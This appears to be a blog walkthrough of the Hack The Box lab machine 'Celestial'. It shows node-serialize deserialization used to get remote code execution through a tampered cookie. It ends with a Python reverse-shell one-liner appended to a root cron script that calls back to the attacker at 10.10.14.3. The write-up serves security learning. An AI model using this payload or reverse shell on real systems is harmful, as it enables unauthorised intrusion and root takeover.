---
title:     "Hack The Box - Celestial"
tags: [linux,medium,node,serialize,cron]
layout: post
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/1.png)

We are going to pwn Celestial by 3ndG4me from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/130>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Only One port Available and it is a Node.js Express framework so let's check the webpage of it.

## HTTP:

It displayes a message and nothing else.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/2.png)

Since it is ``Node.js`` framework, Capture the webpage request in burp and check for interesting things.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/3.png)
There is  ``Profile`` cookie in request header and its seems like Base64 encoded, and the Cookie start with ``eyJ`` it is JSON Web Token. 

It is Base64 encoded cookie this information is displayed in response header.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/4.png)

Since it is Base64 encoded cookie, why dont we change it and encode it with base64 and pass it as cookie.<br/>

I changed the ``"num":"2"`` to ``"num":"3"`` and encoded it with base64.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/5.png)
Now I copied that base64 encoded cookie and pass it to the Request Header Cookie.<br/>

The Output Now changes to ``Hey Dummy 3 + 3 is 33`` so If we change the ``num`` in the cookie, it changes in the response. This is because of a module called [node-serialize](https://www.npmjs.com/package/node-serialize)<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/5.1.png)

I searched for NodeJs Serialize exploits and found this link.
><https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>

According to the article, the data we send as a cookie value was passed into the ``unserialize()`` function which unserialize the serialized format code and execute it accordingly. Since Node.js and plenty of other languages rely on the serializtion of the objects, the main issue lies in the parsing of this data whether they contain any malicious code or not. Taking advantage of this, we can generate a payload and due to which try to execute something that can help us in futher exploitation. Once payload created, we can pass it as a cookie value, which then passed into `unserialize`, hence deserialization of the our payload will execute the code.

## Payload Generation:

I started with [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to create our reverse shell with Our machine IP.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/6.png)

We need to generate the serialize payload by using ``log.js``<br/>

``log.js``
```
var y = {
 rce : function(){}
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```
Before doing this make you sure you need to do this.
```
apt install nodejs
apt install npm
npm install node-serialize
```

Copy the payload we got from the python script and paste that in ``function(){PAYLOAD}`` and execute it.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/7.png)

Now we got Serialized payload, Copy the payload and encode as Base64, don't forgot to add brackets ``()`` after the function body.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/8.png)

## Gaining Shell:

Paste the encoded Base64 in ``Cookie : Profile=``, send the request and start the listener.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/9.png)
Got the shell as user ``sun``. You can get the user Flag in ``/Documents``.


## Privilege Escalation:

Uploaded ``pspy`` to the box to check any process running in the background.

>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/10.png)
There is a python script in ``/Document/script.py`` which is running as root. We have write permission on the file too. So I upload python reverese shell.

```
$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> script.py
```
Started my listener and I got Root!!<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-celestial/11.png)

